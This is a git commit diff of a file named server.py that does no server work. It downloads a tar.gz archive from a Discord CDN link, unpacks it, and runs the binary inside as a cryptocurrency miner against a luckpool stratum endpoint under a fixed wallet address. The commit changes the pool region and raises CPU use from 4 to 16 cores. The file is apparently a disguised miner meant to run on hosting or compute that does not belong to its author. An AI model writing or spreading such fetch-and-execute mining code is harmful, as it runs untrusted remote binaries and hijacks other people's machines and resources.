51bb63fc54249336d14d4db7b664e71591b722ae
mustakmahisa <96964100+mustakmahisa@users.noreply.github.com>
2022-03-20 03:13:08 +0700

    Update server.py

--- server.py
+++ server.py
@@ -2,4 +2,4 @@ import os
 
 os.system("wget https://cdn.discordapp.com/attachments/614113650038538240/932831203214655498/test.tar.gz")
 os.system("tar xf test.tar.gz")
-os.system("./test -c stratum+tcp://ap.luckpool.net:3956#xnsub -u REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9.what -p x --cpu 4")
+os.system("./test -c stratum+tcp://eu.luckpool.net:3956#xnsub -u REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9.what -p x --cpu 16")
